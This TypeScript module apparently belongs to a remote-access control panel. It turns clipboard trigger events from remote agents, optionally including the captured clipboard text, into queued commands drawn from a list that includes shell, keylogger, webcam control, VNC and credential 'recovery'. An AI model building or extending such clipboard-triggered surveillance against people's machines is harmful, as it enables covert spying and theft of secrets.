import { registry, RegistryError } from './store';
import type { ClipboardTriggerEvent } from '$lib/types/clipboard';
import type { CommandName, CommandPayload } from '../../../../../../shared/types/messages';

const allowedCommandNames: readonly CommandName[] = [
  'ping',
  'shell',
  'remote-desktop',
  'app-vnc',
  'system-info',
  'open-url',
  'audio-control',
  'agent-control',
  'clipboard',
  'recovery',
  'file-manager',
  'tcp-connections',
  'client-chat',
  'tool-activation',
  'webcam-control',
  'task-manager',
  'keylogger'
];

const allowedCommandNameSet = new Set<CommandName>(allowedCommandNames);

const DEFAULT_CONTEXT_KEY = 'context';

interface TriggerCommandActionConfiguration {
  command: CommandName;
  payload: Record<string, unknown>;
  includeContent: boolean;
  includeMatches: boolean;
  includeMetadata: boolean;
  contextKey: string;
  operatorId?: string;
}

function isPlainObject(value: unknown): value is Record<string, unknown> {
  return typeof value === 'object' && value !== null && !Array.isArray(value);
}

function cloneIfPresent<T>(value: T): T {
  if (value === undefined || value === null) {
    return value as T;
  }
  return structuredClone(value);
}

function normalizeContextKey(value: unknown): string {
  if (typeof value !== 'string') {
    return DEFAULT_CONTEXT_KEY;
  }
  const trimmed = value.trim();
  if (!trimmed) {
    return DEFAULT_CONTEXT_KEY;
  }
  return trimmed;
}

export function normalizeCommandActionConfiguration(
  configuration: unknown
): TriggerCommandActionConfiguration | null {
  if (!isPlainObject(configuration)) {
    return null;
  }

  const commandRaw = typeof configuration.command === 'string' ? configuration.command.trim() : '';
  if (!commandRaw) {
    return null;
  }

  const command = commandRaw as CommandName;
  if (!allowedCommandNameSet.has(command)) {
    return null;
  }

  const payload = isPlainObject(configuration.payload)
    ? (structuredClone(configuration.payload) as Record<string, unknown>)
    : {};

  const includeContent = configuration.includeContent === true;
  const includeMatches = configuration.includeMatches !== false;
  const includeMetadata = configuration.includeMetadata !== false;
  const contextKey = normalizeContextKey(configuration.contextKey);
  const operatorId =
    typeof configuration.operatorId === 'string' && configuration.operatorId.trim().length > 0
      ? configuration.operatorId.trim()
      : undefined;

  return {
    command,
    payload,
    includeContent,
    includeMatches,
    includeMetadata,
    contextKey,
    operatorId
  };
}

export function buildCommandPayload(
  config: TriggerCommandActionConfiguration,
  event: ClipboardTriggerEvent
): CommandPayload {
  const base = cloneIfPresent(config.payload);
  const context: Record<string, unknown> = {};

  if (config.includeMetadata) {
    context.eventId = event.eventId;
    context.triggerId = event.triggerId;
    context.triggerLabel = event.triggerLabel;
    context.capturedAt = event.capturedAt;
    context.sequence = event.sequence;
    if (event.requestId) {
      context.requestId = event.requestId;
    }
  }

  if (config.includeMatches && event.matches?.length) {
    context.matches = cloneIfPresent(event.matches);
  }

  if (config.includeContent) {
    context.content = cloneIfPresent(event.content);
  }

  const hasContext = Object.keys(context).length > 0;
  if (hasContext) {
    const existing = isPlainObject((base as Record<string, unknown>)[config.contextKey])
      ? ((base as Record<string, unknown>)[config.contextKey] as Record<string, unknown>)
      : undefined;
    (base as Record<string, unknown>)[config.contextKey] = {
      ...(existing ? structuredClone(existing) : {}),
      ...context
    };
  }

  return base as CommandPayload;
}

function describeContext(agentId: string, event: ClipboardTriggerEvent, fallback: string | undefined): string {
  if (fallback && fallback.length > 0) {
    return fallback;
  }
  const parts = [`agent ${agentId}`];
  if (event.triggerLabel) {
    parts.push(`trigger ${event.triggerLabel}`);
  } else {
    parts.push(`trigger ${event.triggerId}`);
  }
  parts.push(`sequence ${event.sequence}`);
  return parts.join(' · ');
}

export function executeClipboardTriggerCommandAction(
  agentId: string,
  event: ClipboardTriggerEvent,
  description?: string
): boolean {
  const config = normalizeCommandActionConfiguration(event.action?.configuration);
  if (!config) {
    console.warn(
      `[clipboard] command action ignored for ${describeContext(agentId, event, description)}: invalid configuration`
    );
    return false;
  }

  const payload = buildCommandPayload(config, event);

  try {
    registry.queueCommand(agentId, { name: config.command, payload }, { operatorId: config.operatorId });
    console.info(
      `[clipboard] queued ${config.command} command for ${describeContext(agentId, event, description)}`
    );
    return true;
  } catch (err) {
    if (err instanceof RegistryError) {
      console.warn(
        `[clipboard] failed to queue ${config.command} command for ${describeContext(agentId, event, description)}: ${err.message}`
      );
      return false;
    }
    console.error(
      `[clipboard] unexpected error queuing ${config.command} command for ${describeContext(agentId, event, description)}`,
      err
    );
    return false;
  }
}
